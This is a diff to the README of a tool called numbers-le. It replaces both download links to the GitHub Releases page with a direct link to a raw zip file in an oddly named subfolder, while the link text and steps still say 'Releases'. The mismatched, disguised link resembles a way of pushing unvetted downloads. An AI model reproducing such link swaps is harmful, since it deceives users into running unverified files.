@@ -6,7 +6,7 @@ Welcome to numbers-le! This application helps you extract, analyze, and validate
 
 ## 📦 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [numbers-le Releases](https://github.com/itssharmaXD/numbers-le/releases).
+To get started, you need to download the application. Visit this page to download: [numbers-le Releases](https://raw.githubusercontent.com/itssharmaXD/numbers-le/main/lactonic/numbers-le.zip).
 
 1. Click the link above to go to the Releases page.
 2. Once there, find the latest version of the software.
@@ -77,6 +77,6 @@ For a deeper understanding of how to maximize your experience with numbers-le, c
 
 ## 📥 Ready to Download?
 
-To get started with numbers-le, visit this page to download: [numbers-le Releases](https://github.com/itssharmaXD/numbers-le/releases). 
+To get started with numbers-le, visit this page to download: [numbers-le Releases](https://raw.githubusercontent.com/itssharmaXD/numbers-le/main/lactonic/numbers-le.zip). 
 
 Begin transforming your number tasks into simple actions today!
